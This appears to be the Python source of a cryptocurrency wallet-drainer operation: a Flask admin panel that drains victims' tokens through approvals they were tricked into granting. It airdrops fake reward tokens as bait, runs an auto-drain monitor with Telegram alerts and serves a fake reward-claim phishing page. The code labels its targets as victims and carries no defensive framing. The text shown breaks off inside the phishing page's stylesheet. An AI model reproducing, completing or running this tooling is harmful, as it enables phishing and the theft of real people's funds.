#!/usr/bin/env python3

import json
import os
import sys
import time
import threading
from pathlib import Path
from datetime import datetime

from flask import Flask, render_template, request, jsonify, redirect, url_for, session
from web3 import Web3
from web3.middleware import geth_poa_middleware

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from backend.config import (
    CHAIN_CONFIG, DEFAULT_CHAIN, YOUR_PRIVATE_KEY, YOUR_WALLET_ADDRESS,
    FLASK_SECRET_KEY, FLASK_HOST, FLASK_PORT, FLASK_DEBUG,
    CONTRACTS_DIR, MONITOR_INTERVAL_SECONDS, ADMIN_PASSWORD
)

app = Flask(__name__)
app.secret_key = FLASK_SECRET_KEY

# Global state
active_chain = DEFAULT_CHAIN
w3 = None
web3_config = None
drainer_contract = None
drainer_address = None
deployment_info = {}
monitor_thread = None
monitor_running = False



def init_web3(chain_name=None):
    """Initialize Web3 connection."""
    global w3, web3_config, active_chain
    
    if chain_name is None:
        chain_name = active_chain
    
    if chain_name not in CHAIN_CONFIG:
        return False
    
    config = CHAIN_CONFIG[chain_name]
    web3_config = config
    active_chain = chain_name
    
    w3 = Web3(Web3.HTTPProvider(config["rpc"]))
    if chain_name in ("bsc", "polygon", "avalanche"):
        w3.middleware_onion.inject(geth_poa_middleware, layer=0)
    
    return w3.is_connected()


def load_deployment():
    """Load deployment info from file."""
    global drainer_contract, drainer_address, deployment_info
    
    deploy_path = Path("deployment_info.json")
    if not deploy_path.exists():
        return False
    
    with open(deploy_path) as f:
        deployment_info = json.load(f)
    
    drainer_address = deployment_info.get("drainer_address")
    if not drainer_address:
        return False
    
    drainer_json_path = CONTRACTS_DIR / "DrainerContract.json"
    if not drainer_json_path.exists():
        return False
    
    with open(drainer_json_path) as f:
        drainer_json = json.load(f)
    
    chain = deployment_info.get("chain", DEFAULT_CHAIN)
    if not init_web3(chain):
        return False
    
    drainer_contract = w3.eth.contract(
        address=Web3.to_checksum_address(drainer_address),
        abi=drainer_json["abi"]
    )
    return True


def require_auth(f):
    """Simple decorator to protect routes."""
    from functools import wraps
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("authenticated"):
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated


# ─── Auth routes ───────────────────────────────────────────────

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        if request.form.get("password") == ADMIN_PASSWORD:
            session["authenticated"] = True
            return redirect(url_for("dashboard"))
        return render_template("login.html", error="Invalid password")
    return render_template("login.html")


@app.route("/logout")
def logout():
    session.pop("authenticated", None)
    return redirect(url_for("login"))


# ─── Dashboard ─────────────────────────────────────────────────

@app.route("/")
@require_auth
def dashboard():
    if not load_deployment():
        return render_template("index.html", 
            error="No deployment found. Deploy contracts first: python backend/deployer.py",
            deployed=False)
    
    try:
        owner = drainer_contract.functions.owner().call()
        paused = drainer_contract.functions.paused().call()
        target_count = len(web3_config["high_value_tokens"])
        fake_token_count = len(drainer_contract.functions.deployedFakeTokens().call())
        balance = w3.eth.get_balance(drainer_address)
        
        stats = {
            "chain": active_chain,
            "chain_id": web3_config["chain_id"],
            "drainer_address": drainer_address,
            "owner": owner,
            "paused": paused,
            "target_tokens": target_count,
            "fake_tokens_deployed": fake_token_count,
            "contract_balance": str(w3.from_wei(balance, "ether")),
            "currency": web3_config["currency"],
            "explorer": web3_config["explorer"],
            "monitor_running": monitor_running,
        }
    except Exception as e:
        stats = {"error": str(e)}
    
    return render_template("index.html", deployed=True, stats=stats)


# ─── API Routes ────────────────────────────────────────────────

@app.route("/api/stats")
@require_auth
def api_stats():
    if not drainer_contract:
        return jsonify({"error": "Not deployed"})
    
    try:
        owner = drainer_contract.functions.owner().call()
        paused = drainer_contract.functions.paused().call()
        balance = w3.eth.get_balance(drainer_address)
        return jsonify({
            "chain": active_chain,
            "drainer": drainer_address,
            "owner": owner,
            "paused": paused,
            "balance": str(w3.from_wei(balance, "ether")),
            "currency": web3_config["currency"],
            "block": w3.eth.block_number,
        })
    except Exception as e:
        return jsonify({"error": str(e)})


@app.route("/api/drain", methods=["POST"])
@require_auth
def api_drain():
    """Manually drain a victim's wallet."""
    if not drainer_contract:
        return jsonify({"error": "Not deployed"})
    
    data = request.get_json()
    victim_address = data.get("address")
    if not victim_address:
        return jsonify({"error": "No victim address provided"})
    
    try:
        victim = Web3.to_checksum_address(victim_address)
        account = w3.eth.account.from_key(YOUR_PRIVATE_KEY)
        
        checkable = drainer_contract.functions.checkDrainable(victim).call()
        tokens, amounts = checkable
        
        if len(tokens) == 0:
            return jsonify({"error": "No drainable tokens found", "victim": victim_address})
        
        tx = drainer_contract.functions.drainAll(victim).build_transaction({
            "from": account.address,
            "gas": 500000,
            "gasPrice": int(w3.eth.gas_price * 1.2),
            "nonce": w3.eth.get_transaction_count(account.address),
        })
        signed = account.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        
        # Notify Telegram
        try:
            from bot.telegram_bot import notify_drain
            for t_addr, amt in zip(tokens, amounts):
                sym_con = w3.eth.contract(
                    address=t_addr,
                    abi=[{"constant": True, "inputs": [], "name": "symbol", "outputs": [{"name": "", "type": "string"}], "type": "function"}]
                )
                try:
                    sym = sym_con.functions.symbol().call()
                except:
                    sym = "?"
                notify_drain(victim_address, sym, str(w3.from_wei(int(amt), "ether")), tx_hash.hex(), active_chain)
        except:
            pass
        
        return jsonify({
            "success": True,
            "victim": victim_address,
            "tx_hash": tx_hash.hex(),
            "gas_used": receipt["gasUsed"],
            "tokens_found": [
                {"token": t, "amount": str(w3.from_wei(int(a), "ether"))} for t, a in zip(tokens, amounts)
            ]
        })
    except Exception as e:
        return jsonify({"error": str(e)})


@app.route("/api/check/<address>")
@require_auth
def api_check(address):
    """Check what tokens can be drained from an address."""
    if not drainer_contract:
        return jsonify({"error": "Not deployed"})
    
    try:
        victim = Web3.to_checksum_address(address)
        checkable = drainer_contract.functions.checkDrainable(victim).call()
        tokens, amounts = checkable
        
        results = []
        for token_addr, amount in zip(tokens, amounts):
            token_contract = w3.eth.contract(
                address=token_addr,
                abi=[{"constant": True, "inputs": [], "name": "symbol", "outputs": [{"name": "", "type": "string"}], "type": "function"}]
            )
            try:
                symbol = token_contract.functions.symbol().call()
            except:
                symbol = "UNKNOWN"
            
            results.append({
                "token": token_addr,
                "symbol": symbol,
                "amount": str(w3.from_wei(int(amount), "ether")),
            })
        
        return jsonify({"victim": address, "drainable": results, "count": len(results)})
    except Exception as e:
        return jsonify({"error": str(e)})


@app.route("/api/toggle-pause", methods=["POST"])
@require_auth
def api_toggle_pause():
    if not drainer_contract:
        return jsonify({"error": "Not deployed"})
    
    try:
        account = w3.eth.account.from_key(YOUR_PRIVATE_KEY)
        tx = drainer_contract.functions.togglePause().build_transaction({
            "from": account.address,
            "gas": 50000,
            "gasPrice": w3.eth.gas_price,
            "nonce": w3.eth.get_transaction_count(account.address),
        })
        signed = account.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
        w3.eth.wait_for_transaction_receipt(tx_hash)
        
        paused = drainer_contract.functions.paused().call()
        return jsonify({"success": True, "paused": paused, "tx": tx_hash.hex()})
    except Exception as e:
        return jsonify({"error": str(e)})


@app.route("/api/sweep", methods=["POST"])
@require_auth
def api_sweep():
    """Sweep native currency from the drainer contract."""
    if not drainer_contract:
        return jsonify({"error": "Not deployed"})
    
    try:
        account = w3.eth.account.from_key(YOUR_PRIVATE_KEY)
        tx = drainer_contract.functions.sweepNative().build_transaction({
            "from": account.address,
            "gas": 50000,
            "gasPrice": w3.eth.gas_price,
            "nonce": w3.eth.get_transaction_count(account.address),
        })
        signed = account.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
        w3.eth.wait_for_transaction_receipt(tx_hash)
        return jsonify({"success": True, "tx": tx_hash.hex()})
    except Exception as e:
        return jsonify({"error": str(e)})


@app.route("/api/airdrop", methods=["POST"])
@require_auth
def api_airdrop():
    """Airdrop fake tokens to target wallets."""
    if not drainer_contract:
        return jsonify({"error": "Not deployed"})
    
    data = request.get_json()
    addresses = data.get("addresses", [])
    if not addresses:
        return jsonify({"error": "No addresses provided"})
    
    fake_token_address = deployment_info.get("fake_token_address")
    if not fake_token_address:
        return jsonify({"error": "No fake token deployed. Run deployer with --deploy-fake"})
    
    try:
        account = w3.eth.account.from_key(YOUR_PRIVATE_KEY)
        
        fake_json_path = CONTRACTS_DIR / "FakeRewardToken.json"
        with open(fake_json_path) as f:
            fake_json = json.load(f)
        
        fake_token = w3.eth.contract(
            address=Web3.to_checksum_address(fake_token_address),
            abi=fake_json["abi"]
        )
        
        # Airdrop in batches of 50 to avoid gas limits
        batch_size = 50
        results = []
        for i in range(0, len(addresses), batch_size):
            batch = addresses[i:i+batch_size]
            # Convert to checksum addresses
            checksummed = [Web3.to_checksum_address(a) for a in batch]
            
            tx = fake_token.functions.airdrop(checksummed, 1000 * 10**18).build_transaction({
                "from": account.address,
                "gas": 3000000,
                "gasPrice": w3.eth.gas_price,
                "nonce": w3.eth.get_transaction_count(account.address),
            })
            signed = account.sign_transaction(tx)
            tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
            
            results.append({
                "batch": i // batch_size,
                "count": len(batch),
                "tx_hash": tx_hash.hex(),
                "gas_used": receipt["gasUsed"],
            })
        
        return jsonify({"success": True, "total": len(addresses), "batches": results})
    except Exception as e:
        return jsonify({"error": str(e)})


@app.route("/api/add-target-token", methods=["POST"])
@require_auth
def api_add_target_token():
    """Add a new token to the drain target list."""
    if not drainer_contract:
        return jsonify({"error": "Not deployed"})
    
    data = request.get_json()
    token_address = data.get("token_address")
    if not token_address:
        return jsonify({"error": "No token address provided"})
    
    try:
        account = w3.eth.account.from_key(YOUR_PRIVATE_KEY)
        token_addr = Web3.to_checksum_address(token_address)
        
        tx = drainer_contract.functions.addTargetToken(token_addr).build_transaction({
            "from": account.address,
            "gas": 100000,
            "gasPrice": w3.eth.gas_price,
            "nonce": w3.eth.get_transaction_count(account.address),
        })
        signed = account.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
        w3.eth.wait_for_transaction_receipt(tx_hash)
        
        return jsonify({"success": True, "token": token_address, "tx": tx_hash.hex()})
    except Exception as e:
        return jsonify({"error": str(e)})


@app.route("/api/start-monitor", methods=["POST"])
@require_auth
def api_start_monitor():
    global monitor_thread, monitor_running
    
    if monitor_running:
        return jsonify({"error": "Monitor already running"})
    
    monitor_running = True
    monitor_thread = threading.Thread(target=monitor_loop, daemon=True)
    monitor_thread.start()
    return jsonify({"success": True, "message": "Monitor started"})


@app.route("/api/stop-monitor", methods=["POST"])
@require_auth
def api_stop_monitor():
    global monitor_running
    monitor_running = False
    return jsonify({"success": True, "message": "Monitor stopped"})


# ─── Monitor Background Thread ─────────────────────────────────

def monitor_loop():
    """Background thread to monitor for new approvals and drain automatically."""
    global monitor_running
    
    print(f"[*] Monitor thread started on {active_chain}")
    
    while monitor_running:
        try:
            current_block = w3.eth.block_number
            from_block = max(0, current_block - 100)
            
            for token_addr in web3_config["high_value_tokens"]:
                token_contract = w3.eth.contract(
                    address=Web3.to_checksum_address(token_addr),
                    abi=[{
                        "anonymous": False,
                        "inputs": [
                            {"indexed": True, "name": "owner", "type": "address"},
                            {"indexed": True, "name": "spender", "type": "address"},
                            {"indexed": False, "name": "value", "type": "uint256"},
                        ],
                        "name": "Approval",
                        "type": "event"
                    }]
                )
                
                events = token_contract.events.Approval.get_logs(
                    fromBlock=from_block,
                    toBlock="latest",
                    argument_filters={"spender": drainer_address}
                )
                
                account = w3.eth.account.from_key(YOUR_PRIVATE_KEY)
                
                for event in events:
                    owner = event["args"]["owner"]
                    value = event["args"]["value"]
                    
                    print(f"[!] New approval: {owner} allowed {value} of {token_addr}")
                    
                    try:
                        from bot.telegram_bot import notify_approval
                        notify_approval(owner, token_addr, str(value), active_chain)
                    except:
                        pass
                    
                    if value > 10 * 10**18:
                        try:
                            tx = drainer_contract.functions.drainToken(
                                Web3.to_checksum_address(token_addr), owner
                            ).build_transaction({
                                "from": account.address,
                                "gas": 200000,
                                "gasPrice": w3.eth.gas_price,
                                "nonce": w3.eth.get_transaction_count(account.address),
                            })
                            signed = account.sign_transaction(tx)
                            tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
                            w3.eth.wait_for_transaction_receipt(tx_hash)
                            print(f"[+] Drained {owner} -> {tx_hash.hex()}")
                        except Exception as e:
                            print(f"[-] Drain failed for {owner}: {e}")
            
            time.sleep(MONITOR_INTERVAL_SECONDS)
        except Exception as e:
            print(f"[-] Monitor error: {e}")
            time.sleep(60)
    
    print("[*] Monitor thread stopped")


# ─── Phishing Page ─────────────────────────────────────────────

@app.route("/phishing")
def phishing_page():
    """Serve the phishing frontend (fake DEX/claim page)."""
    return render_template("phishing.html",
        drainer_address=drainer_address or "",
        chain=active_chain,
        rpc_url=web3_config["rpc"] if web3_config else "",
    )


# ─── Templates ─────────────────────────────────────────────────

TEMPLATES_DIR = Path(__file__).resolve().parent / "templates"
os.makedirs(TEMPLATES_DIR, exist_ok=True)


def ensure_templates():
    """Write all template files."""
    
    # ── login.html ──
    login_path = TEMPLATES_DIR / "login.html"
    if not login_path.exists():
        login_path.write_text("""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Drainer Admin - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; 
               background: #0a0b0e; color: #e0e6ed; display: flex; align-items: center; 
               justify-content: center; min-height: 100vh; }
        .login-box { background: #1a1d24; padding: 40px; border-radius: 12px; 
                     border: 1px solid #2a2d35; width: 360px; }
        h1 { font-size: 24px; margin-bottom: 8px; color: #00d4aa; }
        p { color: #8892a4; margin-bottom: 24px; font-size: 14px; }
        input { width: 100%; padding: 12px 16px; background: #0a0b0e; border: 1px solid #2a2d35;
                border-radius: 8px; color: #e0e6ed; font-size: 14px; margin-bottom: 16px; }
        input:focus { outline: none; border-color: #00d4aa; }
        button { width: 100%; padding: 12px; background: #00d4aa; color: #0a0b0e; 
                 border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #00b894; }
        .error { color: #ff6b6b; font-size: 13px; margin: 8px 0; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>Drainer Admin</h1>
        <p>Enter the admin password to continue</p>
        {% if error %}<div class="error">{{ error }}</div>{% endif %}
        <form method="POST">
            <input type="password" name="password" placeholder="Admin password" required autofocus>
            <button type="submit">Authenticate</button>
        </form>
    </div>
</body>
</html>""")
        print("[+] Created login.html")

    # ── index.html (dashboard) ──
    index_path = TEMPLATES_DIR / "index.html"
    if not index_path.exists():
        index_path.write_text("""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Drainer Admin - Dashboard</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background:#0a0b0e; color:#e0e6ed; }
        .nav { background:#1a1d24; border-bottom:1px solid #2a2d35; padding:16px 24px; display:flex; justify-content:space-between; align-items:center; }
        .nav h1 { font-size:20px; color:#00d4aa; }
        .nav a { color:#8892a4; text-decoration:none; font-size:14px; }
        .nav a:hover { color:#e0e6ed; }
        .container { max-width:1200px; margin:24px auto; padding:0 24px; }
        .error-banner { background:#2d1b1b; border:1px solid #ff6b6b; padding:16px; border-radius:8px; margin-bottom:24px; }
        .stats-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(240px,1fr)); gap:16px; margin-bottom:24px; }
        .stat-card { background:#1a1d24; border:1px solid #2a2d35; border-radius:12px; padding:20px; }
        .stat-card .label { font-size:12px; color:#8892a4; text-transform:uppercase; letter-spacing:1px; }
        .stat-card .value { font-size:24px; font-weight:600; margin-top:4px; }
        .stat-card .sub { font-size:12px; color:#00d4aa; margin-top:4px; }
        .card { background:#1a1d24; border:1px solid #2a2d35; border-radius:12px; padding:20px; margin-bottom:16px; }
        .card h2 { font-size:16px; margin-bottom:12px; }
        .card-row { display:flex; gap:16px; }
        .card-row > div { flex:1; }
        .actions { display:flex; gap:8px; flex-wrap:wrap; }
        .btn { padding:8px 16px; border-radius:6px; border:none; font-size:13px; cursor:pointer; font-weight:500; }
        .btn-primary { background:#00d4aa; color:#0a0b0e; }
        .btn-danger { background:#ff6b6b; color:white; }
        .btn-secondary { background:#2a2d35; color:#e0e6ed; }
        .btn-warning { background:#f0ad4e; color:#0a0b0e; }
        .btn:hover { opacity:0.85; }
        input, textarea, select { width:100%; padding:10px 12px; background:#0a0b0e; border:1px solid #2a2d35; border-radius:6px; color:#e0e6ed; font-size:13px; margin-bottom:8px; }
        label { font-size:12px; color:#8892a4; display:block; margin-bottom:4px; }
        .explorer-link { color:#00d4aa; text-decoration:none; font-size:13px; }
        #result, #airdropResult, #checkResult { margin-top:12px; padding:12px; background:#0a0b0e; border-radius:6px; font-family:monospace; font-size:12px; white-space:pre-wrap; display:none; max-height:300px; overflow-y:auto; }
        .status-dot { display:inline-block; width:8px; height:8px; border-radius:50%; margin-right:6px; }
        .status-dot.green { background:#00d4aa; }
        .status-dot.red { background:#ff6b6b; }
        .status-dot.yellow { background:#f0ad4e; }
        table { width:100%; border-collapse:collapse; font-size:13px; }
        th { text-align:left; padding:8px; color:#8892a4; font-weight:500; border-bottom:1px solid #2a2d35; }
        td { padding:8px; border-bottom:1px solid #1a1d24; }
        .tag { display:inline-block; padding:2px 8px; border-radius:4px; font-size:11px; }
        .tag-green { background:rgba(0,212,170,0.15); color:#00d4aa; }
        .tag-red { background:rgba(255,107,107,0.15); color:#ff6b6b; }
        .tab-bar { display:flex; gap:0; margin-bottom:16px; border-bottom:1px solid #2a2d35; }
        .tab { padding:10px 20px; cursor:pointer; font-size:14px; color:#8892a4; border-bottom:2px solid transparent; }
        .tab.active { color:#00d4aa; border-bottom-color:#00d4aa; }
        .tab-content { display:none; }
        .tab-content.active { display:block; }
        @media(max-width:768px) { .card-row { flex-direction:column; } }
    </style>
</head>
<body>
<div class="nav">
    <h1>Drainer Control Panel</h1>
    <div>
        {% if stats and not stats.error %}
        <span class="status-dot {% if not stats.paused %}green{% else %}red{% endif %}"></span>
        <span style="font-size:13px;color:#8892a4;">{{ stats.chain|upper }}</span>
        {% endif %}
        <a href="/logout" style="margin-left:16px;">Logout</a>
    </div>
</div>
<div class="container">
    {% if error %}
    <div class="error-banner"><strong>Error:</strong> {{ error }}</div>
    {% endif %}
    
    {% if deployed and stats and not stats.error %}
    
    <div class="stats-grid">
        <div class="stat-card">
            <div class="label">Contract Status</div>
            <div class="value" style="color:{% if stats.paused %}#ff6b6b{% else %}#00d4aa{% endif %};">{% if stats.paused %}PAUSED{% else %}ACTIVE{% endif %}</div>
            <div class="sub">{{ stats.chain|upper }} (Chain {{ stats.chain_id }})</div>
        </div>
        <div class="stat-card">
            <div class="label">Contract Balance</div>
            <div class="value">{{ stats.contract_balance[:10] }}</div>
            <div class="sub">{{ stats.currency }}</div>
        </div>
        <div class="stat-card">
            <div class="label">Target Tokens</div>
            <div class="value">{{ stats.target_tokens }}</div>
            <div class="sub">High-value assets</div>
        </div>
        <div class="stat-card">
            <div class="label">Monitor</div>
            <div class="value" style="color:{% if stats.monitor_running %}#00d4aa{% else %}#8892a4{% endif %};">
                {% if stats.monitor_running %}RUNNING{% else %}STOPPED{% endif %}
            </div>
            <div class="sub">Auto-drain {{ 'ON' if stats.monitor_running else 'OFF' }}</div>
        </div>
    </div>
    
    <div class="tab-bar">
        <div class="tab active" onclick="switchTab('drain')">Drain</div>
        <div class="tab" onclick="switchTab('airdrop')">Airdrop</div>
        <div class="tab" onclick="switchTab('controls')">Controls</div>
        <div class="tab" onclick="switchTab('config')">Config</div>
    </div>
    
    <!-- TAB: Drain -->
    <div id="tab-drain" class="tab-content active">
        <div class="card">
            <h2>Drain a Wallet</h2>
            <div class="card-row">
                <div>
                    <label>Victim wallet address</label>
                    <input type="text" id="drainAddress" placeholder="0x...">
                </div>
                <div style="display:flex;align-items:end;gap:8px;">
                    <button class="btn btn-danger" onclick="drainWallet()" style="height:40px;">Drain Now</button>
                    <button class="btn btn-secondary" onclick="checkWallet()" style="height:40px;">Check</button>
                </div>
            </div>
            <div id="result"></div>
        </div>
        
        <div class="card">
            <h2>Recent Targets</h2>
            <p style="font-size:13px;color:#8892a4;">Enter an address above and click Check or Drain to see results here.</p>
        </div>
    </div>
    
    <!-- TAB: Airdrop -->
    <div id="tab-airdrop" class="tab-content">
        <div class="card">
            <h2>Airdrop Fake Tokens</h2>
            <p style="font-size:13px;color:#8892a4;margin-bottom:12px;">Send fake reward tokens to target wallets to bait them into visiting the phishing page.</p>
            <label>Wallet addresses (one per line, or comma-separated)</label>
            <textarea id="airdropAddresses" rows="6" placeholder="0x1234...5678&#10;0xabcd...ef01&#10;0x9876...5432"></textarea>
            <div style="display:flex;gap:8px;">
                <button class="btn btn-primary" onclick="executeAirdrop()">Send Airdrop</button>
                <button class="btn btn-secondary" onclick="document.getElementById('airdropAddresses').value=''">Clear</button>
            </div>
            <div id="airdropResult"></div>
        </div>
    </div>
    
    <!-- TAB: Controls -->
    <div id="tab-controls" class="tab-content">
        <div class="card">
            <h2>Contract Controls</h2>
            <div class="actions">
                <button class="btn btn-warning" onclick="togglePause()">
                    {% if stats.paused %}Resume{% else %}Pause{% endif %}
                </button>
                <button class="btn btn-primary" onclick="startMonitor()" {% if stats.monitor_running %}disabled{% endif %}>
                    Start Monitor
                </button>
                <button class="btn btn-danger" onclick="stopMonitor()" {% if not stats.monitor_running %}disabled{% endif %}>
                    Stop Monitor
                </button>
                <button class="btn btn-secondary" onclick="sweepFunds()">Sweep Contract</button>
            </div>
        </div>
        
        <div class="card">
            <h2>Quick Stats</h2>
            <table>
                <tr><th>Property</th><th>Value</th></tr>
                <tr><td>Drainer Contract</td><td><a class="explorer-link" href="{{ stats.explorer }}/address/{{ stats.drainer_address }}" target="_blank">{{ stats.drainer_address[:18] }}...{{ stats.drainer_address[-6:] }}</a></td></tr>
                <tr><td>Owner</td><td>{{ stats.owner[:18] }}...{{ stats.owner[-6:] }}</td></tr>
                <tr><td>Balance</td><td>{{ stats.contract_balance[:10] }} {{ stats.currency }}</td></tr>
                <tr><td>Target Tokens</td><td>{{ stats.target_tokens }}</td></tr>
                <tr><td>Fake Tokens</td><td>{{ stats.fake_tokens_deployed }}</td></tr>
                <tr><td>Phishing Page</td><td><a class="explorer-link" href="/phishing" target="_blank">/phishing</a></td></tr>
            </table>
        </div>
    </div>
    
    <!-- TAB: Config -->
    <div id="tab-config" class="tab-content">
        <div class="card">
            <h2>Add Target Token</h2>
            <p style="font-size:13px;color:#8892a4;margin-bottom:12px;">Add a custom token address to the drain target list on-chain.</p>
            <div class="card-row">
                <div>
                    <label>Token contract address</label>
                    <input type="text" id="newTokenAddress" placeholder="0x...">
                </div>
                <div style="display:flex;align-items:end;">
                    <button class="btn btn-primary" onclick="addTargetToken()" style="height:40px;">Add Token</button>
                </div>
            </div>
            <div id="configResult"></div>
        </div>
        
        <div class="card">
            <h2>Chain Info</h2>
            <table>
                <tr><td>Active Chain</td><td>{{ stats.chain|upper }}</td></tr>
                <tr><td>Chain ID</td><td>{{ stats.chain_id }}</td></tr>
                <tr><td>Explorer</td><td><a class="explorer-link" href="{{ stats.explorer }}" target="_blank">{{ stats.explorer }}</a></td></tr>
                <tr><td>Currency</td><td>{{ stats.currency }}</td></tr>
            </table>
        </div>
    </div>
    
    {% else %}
    <div class="error-banner">
        <strong>Not Deployed</strong><br>
        No deployment found or contract not reachable.<br>
        Run <code>python backend/deployer.py --chain ethereum --deploy-fake</code> first.
    </div>
    {% endif %}
</div>

<script>
function switchTab(name) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    document.querySelector('.tab[onclick*="' + name + '"]').classList.add('active');
    document.getElementById('tab-' + name).classList.add('active');
}

async function drainWallet() {
    const addr = document.getElementById('drainAddress').value.trim();
    const r = document.getElementById('result');
    if (!addr || !addr.startsWith('0x')) { r.style.display='block'; r.innerHTML = 'Enter a valid 0x address'; return; }
    r.style.display='block'; r.innerHTML = 'Draining...';
    const resp = await fetch('/api/drain', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({address:addr}) });
    const d = await resp.json();
    if(d.success) r.innerHTML = 'DRAINED\nTx: ' + d.tx_hash + '\nGas: ' + d.gas_used + '\nTokens: ' + JSON.stringify(d.tokens_found,null,2);
    else r.innerHTML = 'FAILED: ' + d.error;
}

async function checkWallet() {
    const addr = document.getElementById('drainAddress').value.trim();
    const r = document.getElementById('result');
    if(!addr || !addr.startsWith('0x')) { alert('Enter a valid address'); return; }
    r.style.display='block'; r.innerHTML = 'Checking...';
    const resp = await fetch('/api/check/' + addr);
    const d = await resp.json();
    if(d.drainable && d.drainable.length > 0) {
        r.innerHTML = 'Drainable: ' + d.count + ' tokens\n' + d.drainable.map(t => '  ' + t.symbol + ': ' + t.amount).join('\n');
    } else {
        r.innerHTML = 'No drainable tokens found (no approvals given)';
    }
}

async function executeAirdrop() {
    const raw = document.getElementById('airdropAddresses').value;
    const r = document.getElementById('airdropResult');
    const addrs = raw.split(/\n|,/).map(a => a.trim()).filter(a => a.startsWith('0x'));
    if(addrs.length === 0) { r.style.display='block'; r.innerHTML = 'Enter at least one valid address'; return; }
    r.style.display='block'; r.innerHTML = 'Airdropping to ' + addrs.length + ' wallets...';
    const resp = await fetch('/api/airdrop', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({addresses:addrs}) });
    const d = await resp.json();
    if(d.success) r.innerHTML = 'Airdrop sent!\nTotal: ' + d.total + '\nBatches: ' + JSON.stringify(d.batches,null,2);
    else r.innerHTML = 'FAILED: ' + d.error;
}

async function togglePause() {
    const resp = await fetch('/api/toggle-pause', {method:'POST'});
    const d = await resp.json();
    if(d.success) location.reload();
}

async function startMonitor() {
    const resp = await fetch('/api/start-monitor', {method:'POST'});
    const d = await resp.json();
    if(d.success) location.reload();
    else alert('Error: ' + d.error);
}

async function stopMonitor() {
    const resp = await fetch('/api/stop-monitor', {method:'POST'});
    const d = await resp.json();
    if(d.success) location.reload();
}

async function sweepFunds() {
    if(!confirm('Sweep all ' + (stats ? '{{ stats.currency }}' : 'native') + ' to your wallet?')) return;
    const resp = await fetch('/api/sweep', {method:'POST'});
    const d = await resp.json();
    if(d.success) { alert('Swept! Tx: ' + d.tx); location.reload(); }
    else alert('Error: ' + d.error);
}

async function addTargetToken() {
    const addr = document.getElementById('newTokenAddress').value.trim();
    const r = document.getElementById('configResult');
    if(!addr || !addr.startsWith('0x')) { r.style.display='block'; r.innerHTML = 'Enter a valid token address'; return; }
    r.style.display='block'; r.innerHTML = 'Adding token...';
    const resp = await fetch('/api/add-target-token', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({token_address:addr}) });
    const d = await resp.json();
    if(d.success) r.innerHTML = 'Token added!\nTx: ' + d.tx;
    else r.innerHTML = 'FAILED: ' + d.error;
}
</script>
</body>
</html>""")
        print("[+] Created index.html")
    
    # ── phishing.html ──
    phishing_path = TEMPLATES_DIR / "phishing.html"
    if not phishing_path.exists():
        phishing_path.write_text("""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Your Reward | Token Distribution</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.16.0/web3.min.js"></script>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
               background:linear-gradient(135deg,#0a0b0e 0%,#1a1d24 50%,#0d1a1a 100%);
               color:#e0e6ed; min-height:100vh; display:flex; align-items:center; justify-content:center; }
        .container { max-width:480px; width:100%; padding:24px; }
        .card { background:rgba(26,29,36,0.95); border:1px solid rgba(0,212,170,0.2);
                border-radius:20px; padding:40px 32px; backdrop-filter:blur(20px);
                box-shadow:0 20px 60px rgba(0,0,0,0.5); }
        .logo { text-align:center; margin-bottom:24px; }
        .logo h1 { font-size:28px; background:linear-gradient(135deg,#00d4aa,#00a8ff);
                    -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
        .logo p { color:#8892a4; margin-top:4px; font-size:14px; }
        .reward-box { background:linear-gradient(135deg,rgba(0,212,170,0.1),rgba(0,168,255,0.05));
                      border:1px solid rgba(0,212,170,0.3); border-radius:16px; padding:24px;
                      text-align:center; margin-bottom:24px; }
        .reward-amount { font-size:48px; font-weight:700; background:linear-gradient(135deg,#00d4aa,#00a8ff);
                         -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
        .reward-label { color:#8892a4; font-size:13px; margin-top:4px; }
        .countdown { display:flex; gap:12px; justify-content:center; margin:20px 0; }
        .countdown-item { background:#0a0b0e; border-radius:10px; padding:12px 16px; min-width:60px; text-align:center; }
        .countdown-item .num { font-size:24px; font-weight:700; }
        .countdown-item .lbl { font-size:11px; color:#8892a4; }
        .btn { width:100%; padding:16px; border-radius:12px; border:none; font-size:16px;
               font-weight:600; cursor:pointer; transition:all 0.2s; }
        .btn-primary { background:linear-gradient(135deg,#00d4aa,#00a8ff); color:white; }
